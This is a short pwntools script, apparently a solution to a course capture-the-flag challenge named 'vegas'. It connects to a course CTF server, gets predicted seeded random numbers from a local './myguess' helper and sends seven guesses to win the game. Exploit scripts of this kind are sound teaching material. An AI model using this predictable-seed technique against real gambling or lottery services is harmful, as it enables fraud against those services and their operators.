### vegas.py ###
from pwn import *
from subprocess import *
HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
PORT = 2773
BINARY = "./vegas"
r = remote(HOST, PORT)
pause()

r.sendline("somename")
guess = check_output(["./myguess"])
guess_srand = guess.decode().split(" ")[:-1] ##get first 7 numbers
print(guess_srand)
for i in range(7):
    r.sendline("1") #play
    r.sendline(guess_srand[i])
r.interactive()